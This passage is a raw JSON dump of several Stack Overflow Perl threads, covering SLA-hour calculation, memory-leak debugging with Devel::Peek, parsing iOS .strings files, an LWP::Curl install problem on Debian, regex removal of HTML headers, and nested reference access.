"@DanWalker: You really don&#39;t explain enough about your application for me to help any further. If you&#39;re still having trouble then you should open a new question and show your Perl code. And <code>foreach transactions as transaction</code> isn&#39;t Perl so I don&#39;t understand what you mean"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1457051014, "last_edit_date": 1457051014, "creation_date": 1457050366, "answer_id": 35785643, "question_id": 35774218, "link": "https://stackoverflow.com/questions/35774218/how-can-i-calculate-business-sla-hours-with-iterating-over-each-second/35785643#35785643", "title": "How can I calculate business/SLA hours with iterating over each second?", "body": "<p>I think you have the right idea, but recalculating the status of every ticket for every second of elapsed time will take a lot processing, and nothing will have changed for the vast majority of those one-second intervals</p>\n\n<p>The way event simulations work, and the way I think you should write your application, is to create a list of all events where the status might change. So you will want to include all of the <em>status change events</em> for every ticket as well as the start and end of core time on all non-bank-holiday weekdays</p>\n\n<p>That list of events is sorted by timestamp, after which you can just process each event as if your per-second counter has reached that time. The difference is that you no longer have to count through the many intervening seconds where nothing changes, and you should end up with a much more efficient application</p>\n\n<p>I hope that's clear. You may find it easier to process each ticket separately, but the maximum gain will be achieved by processing all tickets simultaneously. You will still have a sorted sequence of events to process, but you will avoid having to reprocess the same core time start and end events over and over again</p>\n\n<p>One more thing I noticed is that you can probably ignore any <code>open</code> status change events. I would guess that tickets either go from <code>new</code> to <code>open</code> and then <code>active</code>, or straight from <code>new</code> to <code>resolved</code>. So a switch between <em>with your company</em> and <em>with the customer</em> will never be made at an <code>open</code> event, and so they can be ignored. Please check this as I am only speaking from my intuition, and clearly know nothing about how your ticketing system has been designed</p>\n"}], "owner": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 0, "accepted_answer_id": 35785643, "answer_count": 3, "score": 0, "last_activity_date": 1457051014, "creation_date": 1457013542, "question_id": 35774218, "link": "https://stackoverflow.com/questions/35774218/how-can-i-calculate-business-sla-hours-with-iterating-over-each-second", "title": "How can I calculate business/SLA hours with iterating over each second?", "body": "<p>Before I spend a lot of time writing the only solution I can think of I was wondering if I'm doing it an inefficient way.</p>\n\n<p>Once a support ticket is closed, a script is triggered, the script is passed an array of 'status-change-events' that happened from call open to close. So you might have 5 changes: new, open, active, stalled, resolved. Each one of these events has a timestamp associated with it.</p>\n\n<p>What I need to do is calculate how much time the call was with us (new, open, active) and how much time it was with the customer (stalled). I also need to figure out how much of the 'us' time was within core hours 08:00 - 18:00 (and how many were non-core), and weekends/bank holidays count towards non-core hours.</p>\n\n<p>My current idea is to for each status change, iterate over every second that occurred and check for core/non_core, and log it. </p>\n\n<p>Here's some pseudo code:</p>\n\n<pre><code>time_since_last = ticket-&gt;creation_date\n\nforeach events as event {\n    time_now = time_since_last\n\n    while (time_now &lt; ticket-&gt;event_date) {\n\n        if ticket-&gt;status = stalled {\n\n            customer_fault_stalled++\n\n        } else {\n\n            work out if it was our fault or not\n            add to the appropriate counter etc\n\n        }\n\n        time_now++\n    }\n}\n</code></pre>\n\n<p>Apologies if it's a little unclear, it's a fairly longwinded problem. Also I'm aware this may be slightly off of SO question guidelines, but I can't think of a better way of wording it and I need some advice before I spend days writing it this way.</p>\n"}, {"tags": ["perl", "memory-leaks"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457032810, "post_id": 35774210, "comment_id": 59233547, "body": "You have made your question unnecessarily complicated. It looks like you have made an attempt to format it sensibly as the text contains several individual newlines that Stack Overflow treats as generic white space. But that isn&#39;t how <i>markdown</i> works. I have edited your post so that it is represented as I think you intended, but please roll back my changes if anything is wrong"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457034223, "post_id": 35774210, "comment_id": 59234437, "body": "Isn&#39;t the substance of your question <b><i>&quot;I want to understand the reference count process&quot;</i></b>? In which case your question is off-topic. I can refer you to <a href=\"http://perldoc.perl.org/perlref.html\" rel=\"nofollow noreferrer\"><i>Perl references and nested data structures</i></a> and <a href=\"http://perldoc.perl.org/perldsc.html\" rel=\"nofollow noreferrer\"><i>Perl Data Structures Cookbook</i></a> but you are asking about the internals of a complex and high-level programming language, and I think you should expect to devote several weeks to understanding how it works"}], "answers": [{"comments": [{"owner": {"reputation": 227, "user_id": 1966084, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/d3e391bb0bbfb4f8b3f1213f47b6460b?s=128&d=identicon&r=PG", "display_name": "yanger", "link": "https://stackoverflow.com/users/1966084/yanger"}, "edited": false, "score": 0, "creation_date": 1457015116, "post_id": 35774458, "comment_id": 59220900, "body": "Thanks  I will look into that.  I also try to understand the output of the Devel::Peek information.  Like FLAGS info, ARRAY, KEYS, RITER, EITER, STASH, ELT I can&#39;t find any documentation that explains what this entries represent."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 227, "user_id": 1966084, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/d3e391bb0bbfb4f8b3f1213f47b6460b?s=128&d=identicon&r=PG", "display_name": "yanger", "link": "https://stackoverflow.com/users/1966084/yanger"}, "edited": false, "score": 0, "creation_date": 1457016327, "post_id": 35774458, "comment_id": 59221905, "body": "@yanger, <a href=\"http://search.cpan.org/dist/illguts/\" rel=\"nofollow noreferrer\">illguts</a>. // The only FLAGS you really care about are IOK, NOK and POK. These indicate whether a scalar contains an integer, float and/or string. // ARRAY is the pointer to the array of buckets. (You need not look at that.) // KEYS is the number of elements in the hash. // FILL is the number of buckets used. (You need not look at that.) // RITER and EITER probably store the state of the hash&#39;s iterator. (You need not look at that.) // Elt is short for elements. (It shows the key and to what it hashes, and is followed by a dump of the value.)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457016622, "post_id": 35774458, "comment_id": 59222149, "body": "Other FLAGS of interest: ROK (contains a ref), OBJECT (blessed), COW (PV is being shared by more than one scalar)."}, {"owner": {"reputation": 227, "user_id": 1966084, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/d3e391bb0bbfb4f8b3f1213f47b6460b?s=128&d=identicon&r=PG", "display_name": "yanger", "link": "https://stackoverflow.com/users/1966084/yanger"}, "edited": false, "score": 0, "creation_date": 1457341989, "post_id": 35774458, "comment_id": 59345847, "body": "So i have a follow up question - is there a limit to the number of keys in the hash? in the example i posted: &quot;KEYS = 210 | FILL = 150 | MAX = 255&quot;  What will happen if i will have 256 KEYS?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1457343208, "post_id": 35774458, "comment_id": 59346510, "body": "Nothing much. Hashes can be considerably larger comfortabley."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": -1, "last_activity_date": 1457014159, "creation_date": 1457014159, "answer_id": 35774458, "question_id": 35774210, "link": "https://stackoverflow.com/questions/35774210/tracking-leak-in-a-big-async-perl-process/35774458#35774458", "title": "Tracking leak in a big async Perl process", "body": "<p>Well, it's hard to answer directly, without any sort of idea what you're actually doing. </p>\n\n<p>But yes - perl uses reference counting to determine if memory is still 'in use'. It's perfectly possible to cause a circular reference, and thus that memory will never be eligible to 'free' and thus it will leak.</p>\n\n<p>The way you can avoid this is via the <code>Scalar::Util</code> module, and the <code>weaken</code> function call - that allows a reference to exist, but not 'count' for reference counting. </p>\n"}, {"tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 1, "last_activity_date": 1457018693, "creation_date": 1457018693, "answer_id": 35776187, "question_id": 35774210, "link": "https://stackoverflow.com/questions/35774210/tracking-leak-in-a-big-async-perl-process/35776187#35776187", "title": "Tracking leak in a big async Perl process", "body": "<p>A typical problem within async (event driven) programs is that objects are often referenced from within callbacks which are attached to some event loop and that one has to be really careful to clean everything up on error. Strategic uses of <code>weaken</code> from <a href=\"https://metacpan.org/pod/Scalar::Util\" rel=\"nofollow\">Scalar::Util</a> helps here a lot.</p>\n\n<p>But once you have the mess it is really hard to debug. I usually use my own module <a href=\"https://metacpan.org/pod/Devel::TrackObjects\" rel=\"nofollow\">Devel::TrackObjects</a> to track down objects which do not get destroyed as expected and consider it easier to use for this purpose than Devel::Peek. But Devel::TrackObjects it can only deal with objects and does not help with other kinds of circular references.</p>\n"}], "owner": {"reputation": 227, "user_id": 1966084, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/d3e391bb0bbfb4f8b3f1213f47b6460b?s=128&d=identicon&r=PG", "display_name": "yanger", "link": "https://stackoverflow.com/users/1966084/yanger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1457033666, "creation_date": 1457013530, "last_edit_date": 1457033666, "question_id": 35774210, "link": "https://stackoverflow.com/questions/35774210/tracking-leak-in-a-big-async-perl-process", "title": "Tracking leak in a big async Perl process", "body": "<p>I am sorry in advance - but this post will not contain a code sample.</p>\n\n<p>I was assigned with a task to debug a memory leak in some module. </p>\n\n<p>In this program I have a management object that holds Data and other Objects. The program uses async methods that updates the managment object from time to time.</p>\n\n<p>I used a Perl module <a href=\"http://metacpan.org/module/Devel::Peek\" rel=\"nofollow\"><code>Devel::Peek</code></a> to dump the object, and I was curious about the reference count. </p>\n\n<p>Since I am using a local variable to print this object - the parent refcount is always 1 as expected. </p>\n\n<p>My 2nd Level - the real management object refcount is always bigger then 1. </p>\n\n<p>All other levels are also always 1 as expected. </p>\n\n<p>Here is an example: </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>SV = RV(0xbb3e244) at 0xbb3e238\n  REFCNT = 1\n  FLAGS = (PADMY,ROK)\n  RV = 0xcf19478\n  SV = PVHV(0xd0e1f98) at 0xcf19478\n    REFCNT = 6\n    FLAGS = (PADMY,OBJECT,OOK,SHAREKEYS)\n    STASH = 0x9b116a0   \"&lt;XXXXX&gt;\"\n    ARRAY = 0xd0ff190  (0:106, 1:104, 2:34, 3:10, 4:2)\n    hash quality = 105.4%\n    KEYS = 210\n    FILL = 150\n    MAX = 255\n    RITER = -1\n    EITER = 0x0\n    Elt \"&lt;XXXXX&gt;\" HASH = 0x10b5af01\n    SV = PVIV(0xce05510) at 0xcf07ba8\n      REFCNT = 1\n      FLAGS = (IOK,POK,pIOK,pPOK)\n      IV = 16200\n      PV = 0xd0fc0d8 \"16200\"\\0\n      CUR = 5\n      LEN = 8\n    Elt \"&lt;XXXXX&gt;\" HASH = 0x3ebbb602\n    SV = PV(0xd10c810) at 0xcfb4350\n      REFCNT = 1\n      FLAGS = (POK,pPOK)\n      PV = 0xd2008d8 \"&lt;XXX&gt;\"\\0\n      CUR = 4\n      LEN = 8\n    Elt \"&lt;XXXXX&gt;\" HASH = 0x1c7c0002\n    SV = RV(0xcf197f4) at 0xcf197e8\n      REFCNT = 1\n      FLAGS = (ROK)\n      RV = 0xd456ba0\n      SV = PVHV(0xd66a11c) at 0xd456ba0\n        REFCNT = 1\n        FLAGS = (PADMY,OOK,SHAREKEYS)\n        ARRAY = 0xd19a8d8  (0:3, 1:3, 2:2)\n        hash quality = 111.4%\n        KEYS = 7\n        FILL = 5\n        MAX = 7\n        RITER = -1\n        EITER = 0x0\n        Elt \"&lt;XXXXX&gt;\" HASH = 0x2d2f24a1\n        SV = RV(0xc2e3fcc) at 0xc2e3fc0\n          REFCNT = 1\n          FLAGS = (ROK)\n          RV = 0xd550548\n</code></pre>\n\n<p>I want to understand the reference count process.</p>\n\n<p>If I understand the management object Ptr is being accessed from several locations. The internal objects are being accessed only once from the management object.</p>\n\n<p>Is it possible that if I update internal fields on the management object from several locations it will cause a memory leak?</p>\n"}, {"tags": ["ios", "regex", "perl", "localization"], "comments": [{"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "edited": false, "score": 0, "creation_date": 1457012846, "post_id": 35773945, "comment_id": 59219121, "body": "<code>&quot;(\\w+)&quot;\\s*=\\s*&quot;(\\w+)&quot;</code> . So <code>dict[$1] = $2</code>;"}], "answers": [{"tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": false, "score": 1, "last_activity_date": 1457013388, "creation_date": 1457013388, "answer_id": 35774159, "question_id": 35773945, "link": "https://stackoverflow.com/questions/35773945/parse-ios-strings-file-into-perl-hash/35774159#35774159", "title": "Parse iOS .strings file into perl hash", "body": "<p>The following script </p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy %hash;\n\nwhile (&lt;&gt;) {\n    if (m{^\\s*\"(\\w+)\"\\s*=\\s*\"(\\w+)\"}) {\n        $hash{$1} = $2;\n    }\n}\n</code></pre>\n\n<p>Gives</p>\n\n<pre><code>{\n    'key_one' =&gt; 'value_one',\n    'key_two' =&gt; 'value_two'\n};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 1, "last_activity_date": 1457014745, "creation_date": 1457014745, "answer_id": 35774692, "question_id": 35773945, "link": "https://stackoverflow.com/questions/35773945/parse-ios-strings-file-into-perl-hash/35774692#35774692", "title": "Parse iOS .strings file into perl hash", "body": "<p>I'd do it like this:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nlocal $/; \nmy %hash = &lt;&gt; =~ m/\"([^\"]+)\"      #something in quotes\n                         \\s*=\\s*  # = and whitespace\n                   \"([^\"]+)\"      # something else in quotes\n                            /gmx; # global, multiline, xtended\n\nprint Dumper \\%hash; \n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>$VAR1 = {\n          'key_two' =&gt; 'value_two',\n          'key_one' =&gt; 'value_one'\n        };\n</code></pre>\n"}], "owner": {"reputation": 355, "user_id": 2674463, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/100001523886634/picture?type=large", "display_name": "Andrei Malygin", "link": "https://stackoverflow.com/users/2674463/andrei-malygin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 35774692, "answer_count": 2, "score": 0, "last_activity_date": 1457014745, "creation_date": 1457012798, "question_id": 35773945, "link": "https://stackoverflow.com/questions/35773945/parse-ios-strings-file-into-perl-hash", "title": "Parse iOS .strings file into perl hash", "body": "<p>So I have .strings iOS localization file. This file format is like this:</p>\n\n<pre><code>/*some comment here*/\n\"key_one\" = \"value_one\"\n\n/*some comment here*/\n\"key_two\" = \"value_two\"\n</code></pre>\n\n<p>I want to parse this into hash, probably using simple regex.</p>\n\n<p>Any kind of help will be much apprichiated.  </p>\n"}, {"tags": ["perl", "curl", "debian"], "answers": [{"tags": [], "owner": {"reputation": 3, "user_id": 6013363, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIRcr.jpg?s=128&g=1", "display_name": "m0numentum", "link": "https://stackoverflow.com/users/6013363/m0numentum"}, "is_accepted": false, "score": 0, "last_activity_date": 1457023187, "creation_date": 1457023187, "answer_id": 35777941, "question_id": 35773102, "link": "https://stackoverflow.com/questions/35773102/lwpcurl-debian-wheezy/35777941#35777941", "title": "LWP::Curl Debian Wheezy", "body": "<p>Thanks for helping.</p>\n\n<p>My code is only including the libs: </p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse LWP::Curl;\n</code></pre>\n\n<p>Here is the content of /home/franck/perl:</p>\n\n<pre><code>total 12\ndrwxr-xr-x 2 franck franck 4096 mars   3 13:43 bin\ndrwxr-xr-x 3 franck franck 4096 mars   3 13:43 lib\ndrwxr-xr-x 3 franck franck 4096 mars   3 13:43 man\n</code></pre>\n\n<p>I checked the lib directory, only 5.14.2 is installed. I'm on a VM with a fresh Debian install so I don't think to have another perl version installed</p>\n\n<p>And I tried to search the Cur.pm file:</p>\n\n<pre><code>root@vmtest:~$ find / -name \"Curl.pm\" -print\nroot@vmtest:~$ \n</code></pre>\n\n<p>nothing returned. </p>\n\n<p>And I already googled why the file is not present whereas I installed the module. </p>\n\n<p>Sorry if I ask something kind of trivial.</p>\n"}, {"tags": [], "owner": {"reputation": 3, "user_id": 6013363, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIRcr.jpg?s=128&g=1", "display_name": "m0numentum", "link": "https://stackoverflow.com/users/6013363/m0numentum"}, "is_accepted": false, "score": 0, "last_activity_date": 1457339441, "creation_date": 1457339441, "answer_id": 35839253, "question_id": 35773102, "link": "https://stackoverflow.com/questions/35773102/lwpcurl-debian-wheezy/35839253#35839253", "title": "LWP::Curl Debian Wheezy", "body": "<p>Finally \\o/ after many many hours of scrolling over logs lines of CPAN I installed libcurl4-gnutls-dev and librtmp-dev packages and it solves my problem. </p>\n\n<p>I don't understand why those are not a dependency of libcurl package on Debian. I tried on Arch Linux and it works at the first time. </p>\n\n<p>Thank you again for your help and sorry for disturbing. </p>\n"}], "owner": {"reputation": 3, "user_id": 6013363, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIRcr.jpg?s=128&g=1", "display_name": "m0numentum", "link": "https://stackoverflow.com/users/6013363/m0numentum"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 297, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1457339441, "creation_date": 1457010533, "question_id": 35773102, "link": "https://stackoverflow.com/questions/35773102/lwpcurl-debian-wheezy", "title": "LWP::Curl Debian Wheezy", "body": "<p>I'm trying to install the LWP::Curl module for a project. </p>\n\n<p>So I first installed it via CPAN: </p>\n\n<pre><code>cpan install LWP::Curl\n</code></pre>\n\n<p>but when I try to execute my code, I'm facing this error: </p>\n\n<pre><code>Can't locate LWP/Curl.pm in @INC (@INC contains: /home/franck/perl5/lib/perl5/5.14.2/x86_64-linux-gnu-thread-multi /home/franck/perl5/lib/perl5/5.14.2 /home/franck/perl5/lib/perl5/x86_64-linux-gnu-thread-multi /home/franck/perl5/lib/perl5 /etc/perl /usr/local/lib/perl/5.14.2 /usr/local/share/perl/5.14.2 /usr/lib/perl5 /usr/share/perl5 /usr/lib/perl/5.14 /usr/share/perl/5.14 /usr/local/lib/site_perl .) at ./test.pl line 4.BEGIN failed--compilation aborted at ./test.pl line 4.\n</code></pre>\n\n<p>So, I tried to install LWP::UserAgent::Cached too but nothing happens, I'm always stuck with this error. </p>\n\n<p>Thank you very much for your time. </p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 27069, "user_id": 2307070, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/l8ha6.jpg?s=128&g=1", "display_name": "Thomas Ayoub", "link": "https://stackoverflow.com/users/2307070/thomas-ayoub"}, "edited": false, "score": 1, "creation_date": 1457009886, "post_id": 35772711, "comment_id": 59216890, "body": "<i>but it doesn&#39;t work</i> &lt;= we&#39;ll need way more information about that"}, {"owner": {"reputation": 187, "user_id": 3550284, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/dcba9e56000a40f7b536360634ca03e6?s=128&d=identicon&r=PG", "display_name": "LaboDJ", "link": "https://stackoverflow.com/users/3550284/labodj"}, "reply_to_user": {"reputation": 27069, "user_id": 2307070, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/l8ha6.jpg?s=128&g=1", "display_name": "Thomas Ayoub", "link": "https://stackoverflow.com/users/2307070/thomas-ayoub"}, "edited": false, "score": 0, "creation_date": 1457009925, "post_id": 35772711, "comment_id": 59216917, "body": "Ok... I&#39;m going to add more informations"}, {"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 1, "creation_date": 1457010114, "post_id": 35772711, "comment_id": 59217066, "body": "Use an html parser and extract all between body tags."}], "answers": [{"comments": [{"owner": {"reputation": 187, "user_id": 3550284, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/dcba9e56000a40f7b536360634ca03e6?s=128&d=identicon&r=PG", "display_name": "LaboDJ", "link": "https://stackoverflow.com/users/3550284/labodj"}, "edited": false, "score": 0, "creation_date": 1457011069, "post_id": 35772872, "comment_id": 59217759, "body": "It seems it&#39;s not working... I updated my question with per script and output file"}], "tags": [], "owner": {"reputation": 37822, "user_id": 1231450, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/b9c98b4ce12bf9fd925d8c35c8861bb2?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/1231450/jan"}, "is_accepted": false, "score": 0, "last_activity_date": 1457009973, "last_edit_date": 1495542224, "creation_date": 1457009973, "answer_id": 35772872, "question_id": 35772711, "link": "https://stackoverflow.com/questions/35772711/perl-regex-on-html-markup/35772872#35772872", "title": "Perl regex on HTML markup", "body": "<p>It is usually considered bad practice <a href=\"https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags\">to work with regular expressions on HTML</a>, however you could nevertheless come up with:</p>\n\n<pre><code>(?s)&lt;!DOCTYPE html&gt;.+?&lt;body&gt;(?-s)\n# switches on single line mode (aka dot matches all)\n# takes &lt;!DOCTYPE&gt;\n# everything afterwards lazily (.+?)\n# including the body tag\n# switch off single line mode off again\n</code></pre>\n\n<p>See <a href=\"https://regex101.com/r/gO7iO6/1\" rel=\"nofollow noreferrer\">a demo on regex101.com</a>. It won't work as expected when there's a <code>body</code> tag somewhere in between (including comments, that is).</p>\n"}, {"tags": [], "owner": {"reputation": 54, "user_id": 3179321, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d49fbd6c3fce66e6ac4d35eb1b8aa70f?s=128&d=identicon&r=PG&f=1", "display_name": "mut3", "link": "https://stackoverflow.com/users/3179321/mut3"}, "is_accepted": false, "score": 2, "last_activity_date": 1553108553, "last_edit_date": 1553108553, "creation_date": 1457011740, "answer_id": 35773529, "question_id": 35772711, "link": "https://stackoverflow.com/questions/35772711/perl-regex-on-html-markup/35773529#35773529", "title": "Perl regex on HTML markup", "body": "<p>I'm pretty sure you're reading the file line-by-line which should render your regex useless.  I think you'll either need to read the entire file into a string and use regex that way, or edit your loop logic to remove everything before and after you see the tag.</p>\n\n<p>In general, you should avoid working on HTML with regexes.  Use a DOM extension instead.</p>\n"}, {"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 1, "last_activity_date": 1457014819, "creation_date": 1457014819, "answer_id": 35774718, "question_id": 35772711, "link": "https://stackoverflow.com/questions/35772711/perl-regex-on-html-markup/35774718#35774718", "title": "Perl regex on HTML markup", "body": "<p>Since you are not really parsing HTML, but instead chopping a leading part of the file, you may get away with using regular expressions. This may get much more complicated if you have the target strings in any comments etc, but, if that is not the case, simply using the flip-flop operator <code>..</code> should do it:</p>\n\n<p><code>$ perl -ne 'print unless /&lt;!DOCTYPE html&gt;/i .. /&lt;body&gt;/i' file.html&lt;/pre&gt;</code></p>\n"}], "owner": {"reputation": 187, "user_id": 3550284, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/dcba9e56000a40f7b536360634ca03e6?s=128&d=identicon&r=PG", "display_name": "LaboDJ", "link": "https://stackoverflow.com/users/3550284/labodj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1553108553, "creation_date": 1457009579, "last_edit_date": 1457011288, "question_id": 35772711, "link": "https://stackoverflow.com/questions/35772711/perl-regex-on-html-markup", "title": "Perl regex on HTML markup", "body": "<p>I just want to delete the block between</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n</code></pre>\n\n<p>and</p>\n\n<pre><code> &lt;body&gt;\n</code></pre>\n\n<p>including those ends, using a perl regex.</p>\n\n<p>Example text:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n\n\n&lt;meta charset=\"utf-8\"&gt;\n&lt;meta name=\"generator\" content=\"pandoc\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=yes\"&gt;\n&lt;title&gt;&lt;/title&gt;\n&lt;style&gt;code{white-space: pre;}&lt;/style&gt;\n\n\n\n&lt;![endif]--&gt;;\n\n&lt;body&gt;\n.\n.\n.\nanything here\n</code></pre>\n\n<p>This is only a sample, my real file contains an embedded long javascript</p>\n\n<p>I usually test my regex @ regex101 website and I made this one</p>\n\n<pre><code>&lt;\\!DOCTYPE html&gt;(\\n.*)*&lt;body&gt;\n</code></pre>\n\n<p>and this one that consider any space in the ends.</p>\n\n<pre><code>s/&lt;\\!DOCTYPE html&gt;(\\n.*)*&lt;[ \\t]*body[ \\t]*&gt;//gi;\n</code></pre>\n\n<p>It seems to work good on that website but it doesn't work when I run inside a perl script.</p>\n\n<p>PERL SCRIPT (with @Jan answer):</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy $dirtfile = $ARGV[0];\nmy $cleanfile = \"clean.html\";\n\nopen(IN, \"&lt;\", $dirtfile) or die \"Can't open $dirtfile: $!\";\nopen(OUT, \"&gt;\", $cleanfile) or die \"Can't open $cleanfile: $!\";\n\nwhile (&lt;IN&gt;) {\n  s/(?s)&lt;!DOCTYPE html&gt;.+?&lt;body&gt;(?-s)//gi;\n  print(OUT);\n}\n</code></pre>\n\n<p>OUTPUT:</p>\n\n<pre><code>the same as input\n</code></pre>\n"}, {"tags": ["arrays", "perl", "hash", "reference"], "answers": [{"tags": [], "owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "is_accepted": true, "score": 1, "last_activity_date": 1457010816, "creation_date": 1457010816, "answer_id": 35773188, "question_id": 35772555, "link": "https://stackoverflow.com/questions/35772555/ref-to-a-hash-its-member-array-this-arrays-members-value-how-to-elegant/35773188#35773188", "title": "ref to a hash -&gt; its member array -&gt; this array&#39;s member&#39;s value. How to elegantly access and test?", "body": "<p>You should read about <a href=\"http://perldoc.perl.org/perlop.html#The-Arrow-Operator\" rel=\"nofollow\"><code>Arrow operator(-&gt;)</code></a>. I guess you want something like this:</p>\n\n<pre><code>foreach  my $tag  ('doit', 'source', 'dest') {\n    if(exists $thisSectionConfig -&gt; {$tag}){ \n        my $non0len = ($thisSectionConfig -&gt; {$tag} -&gt; [1] =~ /(\\w+)/) ;         \n    }            \n    else {\n        print STDERR \"No complete \\\"$tag\\\" ... etc ... \\n\";\n        # program exit ...\n    }\n</code></pre>\n"}], "owner": {"reputation": 74, "user_id": 1023294, 